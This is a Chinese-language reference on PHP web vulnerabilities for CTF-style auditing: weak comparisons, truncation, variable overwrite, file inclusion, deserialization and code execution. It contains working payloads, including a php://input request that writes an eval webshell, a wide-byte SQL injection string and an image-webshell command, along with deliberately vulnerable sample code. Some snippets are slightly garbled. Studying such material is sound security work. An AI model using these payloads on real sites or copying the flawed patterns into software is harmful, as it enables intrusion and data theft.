---
description: PHP
---

# PHP

### 变量覆盖

#### extract()

该函数使用数组键名作为变量名，使用数组键值作为变量值。针对数组中的每个元素，将在当前符号表中创建对应的一个变量。条件：若有EXTR\_SKIP则不行。

```php
<?php
$a = "Original";
$my_array = array("a" => "Cat","b" => "Dog", "c" => "Horse");
extract($my_array);
echo "\$a = $a; \$b = $b; \$c = $c";
?>
# 结果：$a = Cat; $b = Dog; $c = Horse
复制代码
```

这里原来是`$a`是original，后面通过extract把`$a`覆盖变成了Cat了,所以这里把原来的变量给覆盖了。

```php
#?shiyan=&flag=1
<?php
$flag='xxx';
extract($_GET);
 if(isset($shiyan))
 {
    $content=trim(file_get_contents($flag)); # content is 0 , flag can be anything,cause file_get_contents cannot open file, return 0
    if($shiyan==$content)
    {
        echo'ctf{xxx}';
    }
   else
   {
    echo'Oh.no';
   }
   }
复制代码
```

#### parse\_str()

解析字符串并注册成变量

```php
$b=1;
Parse_str('b=2');
Print_r($b); # 结果: $b=2
复制代码
```

#### import\_request\_variables()

```php
将 GET/POST/Cookie 变量导入到全局作用域中，全局变量注册。
在5.4之后被取消，只可在4-4.1.0和5-5.4.0可用。
//导入POST提交的变量值，前缀为post_
import_request_variable("p"， "post_");
//导入GET和POST提交的变量值，前缀为gp_，GET优先于POST
import_request_variable("gp"， "gp_");
//导入Cookie和GET的变量值，Cookie变量值优先于GET
import_request_variable("cg"， "cg_");
复制代码
```

#### ?变量覆盖

```php
## 提交参数chs，则可覆盖变量"$chs"的值。$key为chs时，?key就变成$chs
<?
$chs = '';
if($_POST && $charset != 'utf-8'){
    $chs = new Chinese('UTF-8', $charset);
    foreach($_POST as $key => $value){
        ?key = $chs->Convert($value);
    }
    unset($chs);
}
复制代码
```

#### 全局变量覆盖漏洞

原理： `register_globals` 是php中的一个控制选项，可以设置成off或者on, 默认为off, 决定是否将 EGPCS（Environment，GET，POST，Cookie，Server）变量注册为全局变量。 如果register\_globals打开的话, 客户端提交的数据中含有GLOBALS变量名, 就会覆盖服务器上的`$GLOBALS`变量.

`$_REQUEST` 这个超全局变量的值受 `php.ini`中`request_order`的影响，在`php5.3.x`系列中，`request_order`默认值为GP，也就是说默认配置下`$_REQUEST`只包含`$_GET`和`$_POST`而不包括`$_COOKIE`。通过COOKIE就可以提交GLOBALS变量。

```php
<?php
// register_globals =ON
//foo.php?GLOBALS[foobar]=HELLO
echo $foobar;

//为了安全取消全局变量
//var.php?GLOBALS[a]=aaaa&b=111
if (ini_get("register_globals")) foreach($_REQUEST as $k=>$v) unset(${$k});
print $a;
print $_GET[b];
复制代码
```

经过测试，开了register\_globals会卡死

### 绕过过滤的空白字符

原理：[baike.baidu.com/item/控制字符](https://baike.baidu.com/item/%E6%8E%A7%E5%88%B6%E5%AD%97%E7%AC%A6)

```php
控制码
"\0" "%00" (ASCII  0 (0x00))，空字节符。

制表符
"\t" (ASCII  9 (0x09))，水平制表符。

空白字符：
"\n" (ASCII 10 (0x0A))，换行符。
"\v" "\x0b" (ASCII  11 (0x0B))，垂直制表符。
"\f" "%0c" 换页符
"\r" "%0d"(ASCII  13 (0x0D))，回车符。

空格:
" " "%20" (ASCII  32 (0x20))，普通空格符。
复制代码
```

而trim过滤的空白字符有

```php
string trim ( string $str [, string $character_mask = " \t\n\r\0\x0B" ] )
复制代码
```

其中缺少了\f

2 函数对空白字符的特性

is\_numeric函数在开始判断前，会先跳过所有空白字符。这是一个特性。

也就是说，is\_numeirc(" \r\n \t 1.2")是会返回true的。同理，intval(" \r\n \t 12")，也会正常返回12。

案例

\[github.com/bowu678/php…]\(https://github.com/bowu678/php\_bugs/blob/master/02 绕过过滤的空白字符.php)

```php
#?number=%00%0c191
# 1 %00绕过is_numeric
# 2 \f（也就是%0c）在数字前面，trim，intval和is_numeric都会忽略这个字符
复制代码
```

### intval整数溢出

php整数上限溢出绕过intval

intval 函数最大的值取决于操作系统。 32 位系统最大带符号的 integer 范围是 -2147483648 到 2147483647。举例，在这样的系统上， intval('1000000000000') 会返回 2147483647。 64 位系统上，最大带符号的 integer 值是 9223372036854775807。

### intval 四舍五入

```php
# ?a=1024.1
<?php
if($_GET[id]) {
mysql_connect(SAE_MYSQL_HOST_M . ':' . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS);
mysql_select_db(SAE_MYSQL_DB);
$id = intval($_GET[id]); ## 这里过滤只有一个intval
$query = @mysql_fetch_array(mysql_query("select content from ctf2 where id='$id'"));
if ($_GET[id]==1024) {
    echo "<p>no! try again</p>";
    }
  else{
    echo($query[content]);
  }
}
复制代码
```

### 浮点数精度忽略

```php
if ($req["number"] != intval($req["number"]))
复制代码
```

在小数小于某个值（10^-16）以后，再比较的时候就分不清大小了。 输入number = 1.00000000000000010, 右边变成1.0, 而左与右比较会相等。

### 多重加密

题目中有：

```php
$login = unserialize(gzuncompress(base64_decode($requset['token'])));
if($login['user'] === 'ichunqiu'){echo $flag;}
复制代码
```

本地则写：

```php
<?php
$arr = array(['user'] === 'ichunqiu');
$token = base64_encode(gzcompress(serialize($arr)));
print_r($token);
// 得到eJxLtDK0qs60MrBOAuJaAB5uBBQ=
?>
复制代码
```

### 截断

#### iconv 异常字符截断

```php
## 因iconv遇到异常字符就不转后面的内容了，所以可以截断。
## 这里chr(128)到chr(255)都可以截断。
$a='1'.char(130).'2';
echo iconv("UTF-8","gbk",$a); //将字符串的编码从UTF-8转到gbk
echo iconv('GB2312', 'UTF-8', $str); //将字符串的编码从GB2312转到UTF-8
复制代码
```

#### eregi、ereg可用%00截断

功能：正则匹配过滤 条件：要求php<5.3.4

```php
## http://127.0.0.1/Php_Bug/05.php?password=1e9%00*-*
#GET方式提交password，然后用ereg()正则限制了password的形式，只能是一个或者多个数字、大小写字母，继续strlen()限制了长度小于8并且大小必须大于9999999，继续strpos()对password进行匹配，必须含有-，最终才输出flag
#因为ereg函数存在NULL截断漏洞，导致了正则过滤被绕过,所以可以使用%00截断正则匹配。
#对于另一个难题可以使用科学计数法表示，计算器或电脑表达10的的幂是一般是e，也就是1.99714e13=19971400000000，所以构造 1e8 即 100000000 > 9999999，在加上-。于是乎构造password=1e8%00*-*,成功得到答案
<?php
if (isset ($_GET['password'])) {
    if (ereg ("^[a-zA-Z0-9]+$",$_GET['password']) === FALSE)
       {
        echo '<p>You password must be alphanumeric</p>';
    }
    else if (strlen($_GET['password']) < 8 && $_GET['password'] > 9999999)
    {
        if (strpos ($_GET['password'], '*-*') !== FALSE)
        {
            die('Flag: ' . $flag);
        }
        else
        {
            echo('<p>*-* have not been found</p>');
        }
    }
    else
    {
        echo '<p>Invalid password</p>';
    }
}
复制代码
```

#### move\_uploaded\_file 用\0截断

5.4.x<= 5.4.39, 5.5.x<= 5.5.23, 5.6.x <= 5.6.7

在高版本（受影响版本中），PHP把长度比较的安全检查逻辑给去掉了，导致了漏洞的发生

cve：[web.nvd.nist.gov/view/vuln/d…](https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2015-2348)

`move_uploaded_file($_FILES['x']['tmp_name'],"/tmp/test.php\x00.jpg")` 上传抓包修改name为a.php\0jpg（\0是nul字符），可以看到`$_FILES['xx']['name']`存储的字符串是a.php，不会包含\0截断之后的字符，因此并不影响代码的验证逻辑。 但是如果通过`$_REQUEST`方式获取的，则可能出现扩展名期望值不一致的情况，造成“任意文件上传”。

#### inclue用？截断

```php
<?php
$name=$_GET['name'];
$filename=$name.'.php';
include $filename;
?>
复制代码
```

当输入的文件名包含URL时，问号截断则会发生，并且这个利用方式不受PHP版本限制，原因是Web服务其会将问号看成一个请求参数。

测试POC：http://127.0.0.1/test/t1.php?name=http://127.0.0.1/test/secret.txt? 则会打开secret.txt中的文件内容。本测试用例在PHP5.5.38版本上测试通过。

#### 系统长度截断

这种方式在PHP5.3以后的版本中都已经得到了修复。 win260个字符，linux下4\*1024=4096字节

#### mysql长度截断

mysql内的默认字符长度为255，超过的就没了。 由于mysql的sql\_mode设置为default的时候，即没有开启STRICT\_ALL\_TABLES选项时，MySQL对于插入超长的值只会提示warning

#### mysql中utf-8截断

```php
insert into dvwa.test values (14,concat("admin",0xc1,"abc"))
```

写入为admin

### 弱类型比较

原理

比较表：[php.net/manual/zh/t…](http://php.net/manual/zh/types.comparisons.php)

以下等式会成立

```php
'' == 0 == false
'123' == 123
'abc' == 0
'123a' == 123
'0x01' == 1
'0e123456789' == '0e987654321'
[false] == [0] == [NULL] == ['']
NULL == false == 0
true == 1
复制代码
```

#### ==、>、<的弱类型比较

这里用到了PHP弱类型的一个特性，当一个整形和一个其他类型行比较的时候，会先把其他类型转换成整型再比。

```php
##方法1
##$a["a1"]="1e8%00";
##这里用%00绕过is_numeric,然后1e8可以比1336大，因此最后能$v1=1
##方法2
##$a["a1"]=["a"];
##使用数组，可以，因为数组恒大于数字或字符串
##方法3
##$a["a1"]=1337a;
##1337a过is_numeric，又由>转成1337与1336比较
<?php
is_numeric(@$a["a1"])?die("nope"):NULL;
if(@$a["a1"]){
        var_dump($a);
        ($a["a1"]>1336)?$v1=1:NULL;
}
var_dump($v1);
复制代码
```

#### switch 弱类型

```php
// 第一种：弱类型，1e==1
// $x1=1e
// 第二种：利用数组名字bypass
// $x1=1[]
// 传入后为string(3) "1[]",但在switch那里为1
if (isset($_GET['x1']))
{
        $x1 = $_GET['x1'];
        $x1=="1"?die("ha?"):NULL;
        switch ($x1)
        {
        case 0:
        case 1:
                $a=1;
                break;
        }
}
复制代码
```

#### md5比较（0e相等、数组为Null）

```php
md5('240610708') //0e462097431906509019562988736854
md5('QNKCDZO') //0e830400451993494058024219903391
0e 纯数字这种格式的字符串在判断相等的时候会被认为是科学计数法的数字，先做字符串到数字的转换。
md5('240610708')==md5('QNKCDZO'); //True
md5('240610708')===md5('QNKCDZO'); //False

这样的对应数值还有：
var_dump(md5('240610708') == md5('QNKCDZO'));
var_dump(md5('aabg7XSs') == md5('aabC9RqS'));
var_dump(sha1('aaroZmOk') == sha1('aaK1STfY'));
var_dump(sha1('aaO8zKZF') == sha1('aa3OFF9m'));
var_dump('0010e2' == '1e3');
var_dump('0x1234Ab' == '1193131');
var_dump('0xABCdef' == ' 0xABCdef');
复制代码
```

技巧：找出在某一位置开始是0e的，并包含“XXX”的字符串

```php
#方法1
#s1=QNKCDZO&s2=240610708
#方法2
#?s1[]=1&s2[]=2
#利用md5中md5([1,2,3]) == md5([4,5,6]) ==NULL，md5一个list结果为Null
#则可以使：[1] !== [2] && md5([1]) ===md5([2])
define('FLAG', 'pwnhub{THIS_IS_FLAG}');
if ($_GET['s1'] != $_GET['s2']
&& md5($_GET['s1']) == md5($_GET['s2'])) {
echo "success, flag:" . FLAG;
}
复制代码
##这里没有弱类型，但可以让$r查出来是Null，然后提交md5里放数组得Null，于是Null===Null
$name = addslashes($_POST['name']);
$r = $db->get_row("SELECT `pass` FROM `user` WHERE `name`='{$name}'");
if ($r['pass'] === md5($_POST['pass'])) {
echo "success";
}
复制代码
```

#### json传数据{"key":0}

PHP将POST的数据全部保存为字符串形式，也就没有办法注入数字类型的数据了而JSON则不一样，JSON本身是一个完整的字符串，经过解析之后可能有字符串，数字，布尔等多种类型。

```php
application/x-www-form-urlencoded
multipart/form-data
application/json
application/xml
复制代码
```

第一个application/x-www-form-urlencoded，是一般表单形式提交的content-type第二个，是包含文件的表单。第三，四个，分别是json和xml，一般是js当中上传的.

{"key":"0"}

这是一个字符串0，我们需要让他为数字类型，用burp拦截，把两个双引号去掉，变成这样：

{"key":0}

#### strcmp漏洞1：返回0

适用与5.3之前版本的php

`int strcmp ( string $str1 , string $str2 )` // 参数 str1第一个字符串。str2第二个字符串。如果 str1 小于 str2 返回 < 0； 如果 str1 大于 str2 返回 > 0；如果两者相等，返回 0。 当这个函数接受到了不符合的类型，这个函数将发生错误，但是在5.3之前的php中，显示了报错的警告信息后，将return 0,所以可以故意让其报错，则返回0，则相等了。

```php
##flag[]=admin
define('FLAG', 'pwnhub{THIS_IS_FLAG}');
if (strcmp($_GET['flag'], FLAG) == 0) {
echo "success, flag:" . FLAG;
}
复制代码
```

#### strcmp漏洞2：返回Null

修复了上面1的返回0的漏洞，即大于5.3版本后，变成返回NULL。 array和string进行strcmp比较的时候会返回一个null，因为strcmp只会处理字符串参数，如果给个数组的话呢，就会返回NULL。

```php
strcmp($c[1],$d)
```

#### strcmp漏洞3: 判断使用的是 ==

而判断使用的是==，当NULL==0是 bool(true)

#### in\_array，array\_search 弱类型比较

松散比较下，任何string都等于true：

```php
// in_array('a', [true, 'b', 'c'])       // 返回bool(true)，相当于数组里面有字符'a'
// array_search('a', [true, 'b', 'c'])   // 返回int(0)，相当于找到了字符'a'
// array_search 会使用'ctf'和array中的每个值作比较，这里的比较也是弱比较，所以intval('ctf')==0.
if(is_array(@$a["a2"])){
        if(count($a["a2"])!==5 OR !is_array($a["a2"][0])) die("nope");
        $pos = array_search("ctf", $a["a2"]);
        $pos===false?die("nope"):NULL;
        foreach($a["a2"] as $key=>$val){
            $val==="ctf"?die("nope"):NULL;
        }
        $v2=1;
}
复制代码
```

#### sha1() md5() 报错相等绕过（False === False）

sha1()函数默认的传入参数类型是字符串型，给它传入数组会出现错误，使sha1()函数返回错误，也就是返回false

md5()函数如果成功则返回已计算的 MD5 散列，如果失败则返回 FALSE。可通过传入数组，返回错误。

```php
##?name[]=1&password[]=2
## === 两边都是false则成立
if ($_GET['name'] == $_GET['password'])
    echo '<p>Your password can not be your name!</p>';
else if (sha1($_GET['name']) === sha1($_GET['password']))
    die('Flag: '.$flag);
复制代码
```

#### strpos数组NULL(Null !== False)

strpos()输入数组出错返回null

```php
#既要是纯数字,又要有’#biubiubiu’，strpos()找的是字符串,那么传一个数组给它,strpos()出错返回null,null!==false,所以符合要求. 所以输入nctf[]= 那为什么ereg()也能符合呢?因为ereg()在出错时返回的也是null,null!==false,所以符合要求.
<?php
$flag = "flag";
    if (isset ($_GET['nctf'])) {
        if (@ereg ("^[1-9]+$", $_GET['nctf']) === FALSE) # %00截断
            echo '必须输入数字才行';
        else if (strpos ($_GET['nctf'], '#biubiubiu') !== FALSE)
            die('Flag: '.$flag);
        else
            echo '骚年，继续努力吧啊~';
    }
复制代码
```

#### 十六进制与十进制比较

\== 两边的十六进制与十进制比较，是可以相等的。

```php
#?password=0xdeadc0de
#echo  dechex ( 3735929054 ); // 将3735929054转为16进制结果为：deadc0de
<?php
error_reporting(0);
function noother_says_correct($temp)
{
    $flag = 'flag{test}';
    $one = ord('1');  //ord — 返回字符的 ASCII 码值
    $nine = ord('9'); //ord — 返回字符的 ASCII 码值
    $number = '3735929054';
    // Check all the input characters!
    for ($i = 0; $i < strlen($number); $i++)
    {
        // Disallow all the digits!
        $digit = ord($temp{$i});
        if ( ($digit >= $one) && ($digit <= $nine) ) ## 1到9不允许，但0允许
        {
            // Aha, digit not allowed!
            return "flase";
        }
    }
    if($number == $temp)
        return $flag;
}
$temp = $_GET['password'];
echo noother_says_correct($temp);
复制代码
```

### md5注入带入’or’

原理：

```php
md5(string,raw)
raw    可选。规定十六进制或二进制输出格式：
    TRUE - 原始 16 字符二进制格式
    FALSE - 默认。32 字符十六进制数
复制代码
```

当md5函数的第二个参数为True时，编码将以16进制返回，再转换为字符串。而字符串’ffifdyop’的md5加密结果为`'or'<trash>` 其中 trash为垃圾值，or一个非0值为真，也就绕过了检测。

```php
## 执行顺序:字符串：ffifdyop -> md5()加密成276f722736c95d99e921722cf9ed621c->md5(,true)将16进制转成字符串`'or'<trash>`->sql执行`'or'<trash>`造成注入
$sql = "SELECT * FROM admin WHERE username = admin pass = '".md5($password,true)."'";
复制代码
```

### switch没有break

```php
#这里case 0 和 1 没有break,使得程序继续往下执行。
<?php
error_reporting(0);
if (isset($_GET['which']))
{
    $which = $_GET['which'];
    switch ($which)
    {
    case 0:
    case 1:
    case 2:
        require_once $which.'.php';
         echo $flag;
        break;
    default:
        echo GWF_HTML::error('PHP-0817', 'Hacker NoNoNo!', false);
        break;
    }
}
复制代码
```

### 反序列化

```php
<!-- index.php -->
<?php
    require_once('shield.php');
    $x = new Shield();
    isset($_GET['class']) && $g = $_GET['class'];
    if (!empty($g)) {
        $x = unserialize($g);
    }
    echo $x->readfile();
?>
<img src="showimg.php?img=c2hpZWxkLmpwZw==" width="100%"/>
<!-- shield.php -->
<?php
    //flag is in pctf.php
    class Shield {
        public $file;
        function __construct($filename = '') {
            $this -> file = $filename;
        }
        function readfile() {
            if (!empty($this->file) && stripos($this->file,'..')===FALSE
            && stripos($this->file,'/')===FALSE && stripos($this->file,'\\')==FALSE) {
                return @file_get_contents($this->file);
            }
        }
    }
?>
<!-- showimg.php -->
<?php
    $f = $_GET['img'];
    if (!empty($f)) {
        $f = base64_decode($f);
        if (stripos($f,'..')===FALSE && stripos($f,'/')===FALSE && stripos($f,'\\')===FALSE
        //stripos — 查找字符串首次出现的位置（不区分大小写）
        && stripos($f,'pctf')===FALSE) {
            readfile($f);
        } else {
            echo "File not found!";
        }
    }
?>
复制代码
#?class=O:6:"Shield":1:{s:4:"file";s:8:"pctf.php";}
<!-- answer.php -->
<?php

require_once('shield.php');
$x = class Shield();
$g = serialize($x);
echo $g;

?>

<!-- shield.php -->
<?php
    //flag is in pctf.php
    class Shield {
        public $file;
        function __construct($filename = 'pctf.php') {
            $this -> file = $filename;
        }
        function readfile() {
            if (!empty($this->file) && stripos($this->file,'..')===FALSE
            && stripos($this->file,'/')===FALSE && stripos($this->file,'\\')==FALSE) {
                return @file_get_contents($this->file);
            }
        }
    }
?>
复制代码
```

### 文件包含

原理：

include()/include\_once()，require()/require\_once()，中的变量可控

利用方法：

1. 上传图片（含有php代码的图片）
2. 读文件，读php文件
3. 包含日志文件getshell
4. 包含/proc/self/envion文件getshell
5. 如果有phpinfo可以包含临时文件
6. 包含data://或php://input等伪协议（需要allow\_url\_include=On)

封装协议：

```php
file:// — 访问本地文件系统
http:// — 访问 HTTP(s) 网址
ftp:// — 访问 FTP(s) URLs
php:// — 访问各个输入/输出流（I/O streams）
zlib:// — 压缩流
data:// — 数据（RFC 2397）
glob:// — 查找匹配的文件路径模式
phar:// — PHP 归档
ssh2:// — Secure Shell 2
rar:// — RAR
ogg:// — 音频流
expect:// — 处理交互式的流
复制代码
## 访问共享目录
include ('\evilservershell.php');
复制代码
## post提交数据
<?php
  include($_GET['url']);
?>
## http://127.0.0.1/111332.php?url=php://input
## POST内容为：
<?php fwrite(fopen("xxx.php","w"),'<?php eval($_POST["cc"]);?>');?>
复制代码
```

### 提交参数无过滤

原理:过滤了GPC，但没有过滤其它部分。

```php
上传文件相关变量如$_FIle
$_GET，$_POST，$_Cookie，$_SERVER，$_ENV，$_SESSION，$_REQUEST
HTTP_CLIENT_IP 和HTTP_XFORWORDFOR 中的ip不受gpc影响
$_HTTP_COOKIE_VARS
$_HTTP_ENV_VARS
$_HTTP_GET_VARS
$_HTTP_POST_FILES
$_HTTP_POST_VARS
$_HTTP_SERVER_VARS
复制代码
```

案例：

```php
foreach($_COOKIE AS $_key=>$_value){
    unset(?_key);
}
foreach($_POST AS $_key=>$_value){
    !ereg("^\_[A-Z]+",$_key) && ?_key=$_POST[$_key];
}
foreach($_GET AS $_key=>$_value){
    !ereg("^\_[A-Z]+",$_key) && ?_key=$_GET[$_key];
}
复制代码
```

通过表单来传值。

```php
<form method="post" action="http://localhost/qibo/member/comment.php?job=ifcom" enctype="multipart/form-data">
<input type="file" name="cidDB">
<input type="submit">
</form>
复制代码
```

这里的gid为查询参数

```php
$_SERVER                 //中用户能够控制的变量，php5.0后不受GPC影响
QUERY_STRING             //用户GET方法提交时的查询字符串
HTTP_REFERER             //用户请求的来源变量，在一些程序取得用户访问记录时用得比较多
HTTP_USER_AGENT          //用户的浏览器类型，也用于用户的访问记录的取得
HTTP_HOST                //提交的主机头等内容
HTTP_X_FORWARDED_FOR     //用户的代理主机的信息
复制代码
```

### 伪造IP

原理:以 HTTP\_ 开头的 header, 均属于客户端发送的内容。那么，如果客户端伪造user-agent/referer/client-ip/x-forward-for,就可以达到伪造IP的目的,php5之后不受GPC影响。

```php
关键字：
HTTP_
getenv
$_SERVER
服务端：
echo getenv('HTTP_CLIENT_IP');
echo $_SERVER['REMOTE_ADDR']; //访问端（有可能是用户，有可能是代理的）IP
echo $_SERVER['HTTP_CLIENT_IP']; //代理端的（有可能存在，可伪造）
echo $_SERVER['HTTP_X_FORWARDED_FOR']; //用户是在哪个IP使用的代理（有可能存在，也可以伪造）
客户端：
注意发送的格式：
CLIENT-IP:10.10.10.1
X-FORWARDED-FOR:10.10.10.10
复制代码
#这个玩意恒成立的。不管有没有clientip
strcasecmp(getenv('HTTP_CLIENT_IP'), 'unknown')
复制代码
```

### 绕过正则匹配

#### 缺少^和$限定

#### 数组绕过正则

```php
\A[ _a-zA-Z0-9]+\z
```

#### str\_replace路径穿越

原理：str\_replace的过滤方式为其search参数数组从左到右一个一个过滤。

```php
## 这里可以被绕过，因为是对.和/或\的组合的过滤，所以单独的..或\/没有检测到。
## 方法1
## 五个点加///
## 方法2
## ...././/
$dir = str_replace(array('..\\', '../', './', '.\\'), '', trim($dir),$countb);
echo $dir;
echo '</br>替换数量';
echo $countb;
复制代码
## 这里有对单独的.进行过滤，所以无法绕过。
$file = str_replace(array('../', '\\', '..'), array('', '/', ''), $_GET['file'],$counta);
echo $file;
echo '</br>替换数量';
echo $counta;
复制代码
```

### short\_open\_tag=on 短标签

原理：当 php.ini 的short\_open\_tag=on时，PHP支持短标签，默认情况下为off。格式为：`<?xxxx;?> --> <?xxx;`

```php
Go0s@ubuntu:~$ cat test.php
<?="helloworld";
Go0s@ubuntu:~$ curl 127.0.0.1/test.php
helloworld
复制代码
```

### file\_put\_contents第二个参数传入数组

原理：

```php
file_put_contents(file,data,mode,context)
file    必需。规定要写入数据的文件。如果文件不存在，则创建一个新文件。
data    可选。规定要写入文件的数据。可以是字符串、数组或数据流。如果是数组的话，将被连接成字符串再进行写入。
复制代码
## ?filename=xiaowei.php&data[]=<?php&data[]=%0aphpinfo();
## 这个要从burp去传，因为后面的【?】会被理解为参数而截断
<?php
$a = $_GET['data'];
$file = $_GET['filename'];
$current = file_get_contents($file);
file_put_contents($file, $a);
复制代码
```

### 单引号和双引号

原理：单引号或双引号都可以用来定义字符串。但只有双引号会调用解析器。

```php
# 1
$s = "I am a 'single quote string' inside a double quote string";
$s = 'I am a "double quote string" inside a single quote string';
$s = "I am a 'single quote string' inside a double quote string";
$s = 'I am a "double quote string" inside a single quote string';
# 2
$abc='I love u';
echo $abc //结果是:I love u
echo '$abc' //结果是:$abc
echo "$abc" //结果是:I love u
# 3
$a="${@phpinfo()}"; //可以解析出来
<?php $a="${@phpinfo()}";?> //@可以为空格，tab，/**/ ，回车，+，-，!，~,\等
复制代码
```

#### 查询语句缺少单引号

```php
"Select * from table where id=$id" # 有注入
"Select * from table where id=".$id." limit 1" # 有注入
"Select * from table where id='$id'" # 无注入
"Select * from table where id='".$id."' limit 1" # 无注入
复制代码
```

### 宽字符注入

原理:

常见转码函数： iconv() mb\_convert\_encoding() addslashes

防御：

用mysql\_real\_escape\_string

```php
## ?username=tom&password=1%df' or 1=1 union select 1,2,group_concat(0x0a,mname,0x0a,pwd) from manager--+
## %df把\给吃掉，所以这里可以绕过addslashes的转义
$pwd = addslashes($pwd);
mysql_query("SET NAMES gbk");
$query = "select * from user where uname='".$uname."' and pwd='".$pwd."'";
复制代码
```

### 跳转无退出

原理:没有使用return()或die()或exit()退出流程的话，下面的代码还是会继续执行。可以使用burp测试，不会跳转过去。

```php
## 1
$this->myclass->notice('alert("系统已安装过");window.location.href="'.site_url().'";');
## 2
header("location: ../index.php");
复制代码
```

### 二次编码注入

由于浏览器的一次urldecode，再由服务器端函数的一次decode，造成二次编码，而绕过过滤。如%2527，两次urldecode会最后变成'

```php
base64_decode -- 对使用 MIME base64 编码的数据进行解码
base64_encode -- 使用 MIME base64 对数据进行编码
rawurldecode -- 对已编码的 URL 字符串进行解码
rawurlencode -- 按照 RFC 1738 对 URL 进行编码
urldecode -- 解码已编码的 URL 字符串
urlencode -- 编码 URL 字符串
unserialize/serialize
字符集函数（GKB,UTF7/8...）如iconv()/mb_convert_encoding()等
复制代码
```

### 前端可控变量填充导致XSS

当html里的链接是变量时，易出现XSS。

```php
={#、echo、print、printf、vprintf、<%=$test%>
img scr={#$list.link_logo#}
复制代码
```

### 命令执行函数

```php
system()
exec()
passthru()
pcntl_exec()
shell_exec()
echo `whoami`; //反引号调用shell_exec()函数
popen()和proc_open() //不会返回结果
array_map($arr,$array); //为数组的每个元素应用回调函数arr,如$arr = "phpinfo"
popen('whoami >>D: /2.txt', 'r'); //这样就会在D下生成一个2.txt。
preg_replace()
ob_start()
array_map()
复制代码
```

防范方法：

1. 使用自定义函数或函数库来替代外部命令的功能
2. 使用escapeshellarg 函数来处理命令参数
3. 使用safe\_mode\_exec\_dir 指定可执行文件的路径

#### create\_function

create\_function构造了一个return后面的语句为一个函数。

```php
#?sort_by="]);}phpinfo();/*
#sort_function就变成了 return 1 * strnatcasecmp($a[""]);}phpinfo();/*"], $b[""]);}phpinfo();/*"]);
#前面闭合，然后把后面的全部注释掉了。
<?php
$sort_by=$_GET['sort_by'];
$sorter='strnatcasecmp';
$databases=array('test','test');
$sort_function = ' return 1 * ' . $sorter . '($a["' . $sort_by . '"], $b["' . $sort_by . '"]);';
usort($databases, create_function('$a, $b', $sort_function));
复制代码
```

#### mb\_ereg\_replace()的/e模式

原理

```php
mb_ereg_replace()是支持多字节的正则表达式替换函数,函数原型如下:
string mb_ereg_replace  ( string $pattern , string $replacement  , string $string  [, string $option= "msr"  ] )
当指定mb_ereg(i)_replace()的option参数为e时,replacement参数[在适当的逆向引用替换完后]将作为php代码被执行.
复制代码
```

#### preg\_replace /e模式执行命令

```php
# ?str=[phpinfo()]
# 这里使用/e模式，所以第二个参数\\1这里可以执行。
# 通过$_GET传入值，第一个参数正则,把[]去掉，放到了第二个参数里\\1，执行。
preg_replace("/\[(.*)]/e",'\\1',$_GET['str']);
复制代码
```

### 动态函数执行

```php
call_user_func
call_user_func_array
复制代码
# ?a=assert
call_user_func($_GET['a'],$b);
复制代码
```

### 代码执行

```php
assert()
call_user_func()
call_user_func_array()
create_function()
复制代码
```

#### eval()和assert()代码执行

当assert()的参数为字符串时 可执行PHP代码。 区别：assert可以不加;，eval不可以不加。

```php
eval(" phpinfo(); ");【√】 eval(" phpinfo() ");【X】
assert(" phpinfo(); ");【√】 assert(" phpinfo() ");【√】
复制代码
```

### 优先级绕过

原理：如果运算符优先级相同，那运算符的结合方向决定了该如何运算 [php.net/manual/zh/l…](http://php.net/manual/zh/language.operators.precedence.php)

优先级：&&/|| 大于 = 大于 AND/OR

```php
# ($test = true) and false; $test2 = (true && false);
$test = true and false; var_dump($test);//bool(true)
$test2 = true && false; var_dump($test2); //bool(false)
# 当有两个is_numeric判断并用and连接时，and后面的is_numeric可以绕过
$test3 = is_numeric("123") and is_numeric("anything false"); var_dump($test3); //bool(true)
复制代码
```

### getimagesize图片判断绕过

原理：

当用getimagesize判断文件是否为图片,可以判断的文件为gif/png/jpg，如果指定的文件如果不是有效的图像，会返回 false。 只要我们在文件头部加入GIF89a后可以上传任意后缀文件。

生成小马图的方法：

```php
cat image.png webshell.php > image.php
复制代码
## 找上传点
## 文件头部加入GIF89a
# 1
$file = $request->getFiles();
# 2
if(getimagesize($files['users']['photo']['tmp_name']))
        {
          move_uploaded_file($files['users']['photo']['tmp_name'], $filename);
# 3
$filesize = @getimagesize('/path/to/image.png');
if ($filesize) {
    do_upload();
}
复制代码
```

### <变\*，windows findfirstfile利用

原理：Windows下，在搜索文件的时候使用了FindFirstFile这一个winapi函数，该函数到一个文件夹(包含子文件夹)去搜索指定文件。 执行过程中，字符">"被替换成"?"，字符"<"被替换成"\*"，而符号"（双引号）被替换成一个"."字符。所以：

1. ">"">>"可代替一个字符,"<"可以代替后缀名多个字符（即.后的字符），"<<"可以代替包括文件名和后缀名多个字符。所以一般使用<<
2. " 可以代替.
3. 文件名第一个字符是"."的话，读取时可以忽略之

| NO  | Status | Function               | Type of operation      |
| --- | ------ | ---------------------- | ---------------------- |
| 1.  | OK     | include()              | Includefile            |
| 2.  | OK     | include\_once()        | Includefile            |
| 3.  | OK     | require()              | Includefile            |
| 4.  | OK     | require\_once()        | Include file           |
| 5.  | OK     | fopen()                | Openfile               |
| 6.  | OK     | ZipArchive::open()     | Archive file           |
| 7.  | OK     | copy()                 | Copyfile               |
| 8.  | OK     | file\_get\_contents()  | Readfile               |
| 9.  | OK     | parse\_ini\_file()     | Readfile               |
| 10. | OK     | readfile()             | Readfile               |
| 11. | OK     | file\_put\_contents()  | Write file             |
| 12. | OK     | mkdir()                | New directory creation |
| 13. | OK     | tempnam()              | New file creation      |
| 14. | OK     | touch()                | New file creation      |
| 15. | OK     | move\_uploaded\_file() | Move operation         |
| 16. | OK     | opendiit)              | Directory operation    |
| 17. | OK     | readdir()              | Directory operation    |
| 18. | OK     | rewinddir()            | Directory operation    |
| 19. | OK     | closedir()             | Directory operation    |
| 20. | FAIL   | rename()               | Move operation         |
| 21. | FAIL   | unlink()               | Delete file            |
| 22. | FAIL   | rmdir())               | Directory operation    |

```php
## ?file=1<
## ?file=1>
## ?file=1"txt
文件名为1.txt

## ?file=1234.tx>
## ?file=1234.<
## ?file=1<<
## ?file=1<<">
## ?file=123>">
## ?file=>>>4">
## ?file=<<4">
文件名为1234.txt

include('shell<');
include('shell<<');
include('shell.p>p');
include('shell"php');
fopen('.htacess');  //==>fopen("htacess');
file_get_contents('C:boot.ini'); //==>  file_get_contents ('C:/boot.ini');
